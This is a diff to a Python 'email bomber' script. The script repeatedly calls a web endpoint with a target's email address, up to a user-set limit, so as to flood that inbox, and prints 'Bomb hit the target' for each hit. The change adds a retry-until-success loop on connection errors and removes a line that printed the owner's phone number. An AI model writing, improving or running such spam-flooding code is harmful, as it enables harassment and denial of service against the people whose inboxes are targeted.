@@ -154,17 +154,23 @@ def email():
     lim = int(input("Enter limit:"))
     print("\033[0m")
     url = f"https://email-bmb.vercel.app/?mail={mail}"
+
     i = 1
     for i in range(1, lim + 1):
-        print(f"{g}Launching Bomber. Please wait{r}")
+        print(f"{g}Launching the Bomber{r}")
 
         print(f"{b}Bomb Launched{r}")
-        resp = requests.get(url)
-        if resp.status_code == 200:
-            print(f"{g}{i}, Bomb hit the target.{r}")
-        else:
-            print(f"{red}Error. Please contact owner at whatsapp{r}")
-            print("{b}+923495025675{r}")
+
+        while True:
+            att = +1
+            try:
+                resp = requests.get(url, timeout=100)
+                resp.raise_for_status()  # throws error if status is 4xx or 5xx
+                print(f"{g}{i}, Bomb hit the Target.{r}")
+                break
+            except requests.exceptions.ConnectionError:
+                print(f"No connection. Retrying {att}")
+                continue
 
 
 def choice():
